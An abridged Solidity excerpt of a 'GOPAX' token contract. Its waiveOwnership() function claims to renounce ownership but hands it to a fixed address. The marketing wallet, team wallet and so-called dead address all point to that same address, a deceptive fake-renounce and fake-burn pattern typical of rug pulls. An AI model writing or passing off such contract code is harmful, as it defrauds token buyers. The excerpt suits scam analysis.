...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xb38a597bF2e64bD1a071b65906deCB77d6e70C9c));
        _owner = address(0xb38a597bF2e64bD1a071b65906deCB77d6e70C9c);
    }
...
contract GOPAX is Context, IERC20, Ownable {
    ...
    string private _name = "GOPAX";
    string private _symbol = "GOPAX";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb38a597bF2e64bD1a071b65906deCB77d6e70C9c);
    address payable public teamWalletAddress = payable(0xb38a597bF2e64bD1a071b65906deCB77d6e70C9c);
    address public immutable deadAddress = 0xb38a597bF2e64bD1a071b65906deCB77d6e70C9c;
